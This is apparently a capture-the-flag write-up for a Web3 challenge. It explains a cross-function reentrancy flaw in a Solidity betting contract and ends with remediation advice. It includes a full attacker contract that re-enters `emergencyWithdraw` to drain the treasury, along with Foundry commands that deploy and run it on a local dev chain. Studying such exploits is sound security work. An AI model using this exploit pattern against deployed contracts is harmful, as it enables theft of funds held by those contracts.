# stadium_defi — Writeup

**Category:** Web / Web3 · **Difficulty:** Very Hard

This is the hardest challenge in the Infodays 2026 set. It requires
Solidity fluency, EVM execution semantics, and Foundry tooling — three
skills that almost never overlap with "standard web" CTF training.

---

## 1. Recon

Hit the challenge frontend at `http://<host>:8009`:

- Deployed `StadiumBetting` and `TrophyVault` addresses.
- Chain ID `31337` (Anvil dev chain).
- RPC at `http://<host>:8010`.
- Ten pre-funded dev accounts (10000 ETH each). Private key for
  `account[0]` published on the page.
- Links to the full Solidity source of both contracts.

Read the source carefully.

### StadiumBetting.sol — key functions

```solidity
function withdraw(uint256 amount) external nonReentrant {
    require(balance[msg.sender] >= amount, "insufficient");
    balance[msg.sender] -= amount;
    totalDeposited -= amount;
    (bool ok, ) = msg.sender.call{value: amount}("");
    require(ok, "transfer failed");
    emit Withdrawn(msg.sender, amount);
}

/// @dev Legacy helper used by the mobile app before the refactor.
function emergencyWithdraw() external {
    uint256 amount = balance[msg.sender];
    require(amount > 0, "no balance");
    (bool ok, ) = msg.sender.call{value: amount}("");  // call BEFORE state update
    require(ok, "transfer failed");
    balance[msg.sender] = 0;
    emit Withdrawn(msg.sender, amount);
}
```

`withdraw` is correctly protected with `nonReentrant` AND uses
checks-effects-interactions properly. `emergencyWithdraw` is the legacy
variant — it **forgot the `nonReentrant` modifier** and **sends ETH before
zeroing the caller's balance**. Cross-function reentrancy window.

### TrophyVault.sol — gate

```solidity
function claim() external {
    require(!claimed, "already claimed");
    require(betting.balance == 0, "treasury not drained");
    claimed = true;
    emit FlagClaimed(msg.sender, _flag);
}
```

The vault releases the flag as soon as the Stadium Betting contract holds
zero ETH. Normal withdraws cannot zero the balance — the contract was
seeded with house liquidity at deploy time (10 ETH by default). The only
path that produces more ETH out than the caller put in is reentrancy.

## 2. The bug — cross-function reentrancy via `emergencyWithdraw`

Starting state:

- `StadiumBetting.balance[attacker] == 0`
- `address(StadiumBetting).balance == 10 ether` (house seed)

The attacker deposits **10 ether** (matching the house seed) and then calls
`emergencyWithdraw`:

1. Frame 1 reads `amount = balance[attacker] = 10 ether`
2. Sends `10 ether` to `attacker.call{value: 10 ether}("")` — **external
   call fires the attacker's `receive()` hook before any state is updated**
3. Inside `receive()`, contract balance is still `10 ether` (the seed), so
   the attacker reenters `emergencyWithdraw`
4. Frame 2 reads `amount = balance[attacker] = 10 ether` (Frame 1 hasn't
   zeroed it yet). Sends another `10 ether`, draining the seed
5. `receive()` fires again but contract balance is now `0`, so the guard
   short-circuits and the hook returns without reentering
6. Frame 2 unwinds: `balance[attacker] = 0`, emit
7. Frame 1 unwinds: `balance[attacker] = 0` (no-op)

The attacker put in `10 ether` and pulled out `20 ether`. The Betting
treasury is at exactly `0`, unlocking the vault.

**Why this gets past the reentrancy guard:** the guard is on `withdraw`,
not `emergencyWithdraw`. Cross-function reentrancy — they share the same
storage (`balance`), but only one function is locked. Classic bug pattern
(Lendf.me 2020, several Immunefi 2023 reports).

## 3. Exploit — Foundry attacker contract

Attacker contract (`Attacker.sol`), deployed with a few wei for gas:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IStadiumBetting {
    function deposit() external payable;
    function emergencyWithdraw() external;
    function balance(address) external view returns (uint256);
}

interface ITrophyVault {
    function claim() external;
    function flag() external view returns (string memory);
}

contract Attacker {
    IStadiumBetting public immutable betting;
    ITrophyVault public immutable vault;
    address public immutable owner;
    uint256 public constant STAKE = 10 ether;

    constructor(address _betting, address _vault) {
        betting = IStadiumBetting(_betting);
        vault = ITrophyVault(_vault);
        owner = msg.sender;
    }

    function pwn() external payable {
        require(msg.value >= STAKE, "send 10 ether");
        betting.deposit{value: STAKE}();
        betting.emergencyWithdraw();
        vault.claim();
    }

    receive() external payable {
        if (address(betting).balance >= STAKE) {
            betting.emergencyWithdraw();
        }
    }

    function sweep() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
```

Deploy + run with Foundry:

```bash
export BETTING=<address from /deployed.json>
export VAULT=<address from /deployed.json>
export PK=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

# Deploy the attacker
forge create Attacker.sol:Attacker \
    --rpc-url http://<host>:8010 \
    --private-key "$PK" \
    --broadcast \
    --constructor-args "$BETTING" "$VAULT"

# Run the exploit
cast send <ATTACKER> 'pwn()' \
    --rpc-url http://<host>:8010 \
    --private-key "$PK" \
    --value 10ether

# Read the flag via the event log
cast logs --rpc-url http://<host>:8010 \
    'FlagClaimed(address,string)' --from-block 0

# Or read via view function
cast call "$VAULT" 'flag()(string)' --rpc-url http://<host>:8010
```

Expected output:

```
INFODAYS{SaamNoLimits_the_house_always_falls_<random-hex>}
```

## 4. Why Very Hard

- Requires Solidity fluency — the bug lives in source the player must
  read and reason about.
- Requires writing an exploit contract. You cannot solve this with
  `curl`. You need Foundry or Hardhat installed locally, a working key,
  and RPC config.
- Requires understanding EVM execution semantics — how `CALL` stacks
  frames, when `receive()` fires, how storage reads are sequenced vs
  writes.
- Requires recognising a *cross-function* reentrancy, not the more
  common single-function one. Two functions share storage, only one is
  locked.
- The reentrancy loop must terminate cleanly — the attacker's `receive()`
  needs the "stop when treasury is dry" guard, or the transaction reverts
  on the last underflow / failing call.
- No tooling or source of payoffs from the frontend — just the ABI and
  the deployed bytecode.

## 5. Remediation

- Apply the same `nonReentrant` modifier to every function that touches
  shared storage — or delete `emergencyWithdraw` entirely.
- Follow checks-effects-interactions strictly: zero the user's balance
  **before** the external call.
- Use OpenZeppelin's `ReentrancyGuardUpgradeable` or the latest
  `ReentrancyGuardTransient` when possible.
- Prefer `transfer` semantics over raw `.call` for fixed-gas
  interactions with EOAs — but be aware of the Istanbul gas cost shift.
- Audit diff your contract's public surface after refactors. Legacy
  helpers get bolted on and forgotten; they become the exploit vector.

## 6. Related reading

- Lendf.me / dForce 2020 cross-function reentrancy post-mortem.
- SWC-107: Reentrancy.
- Solodit / Immunefi "cross-function reentrancy" writeups
  (2023 — several multi-million bounties on this exact pattern).
- Foundry book: <https://book.getfoundry.sh/>
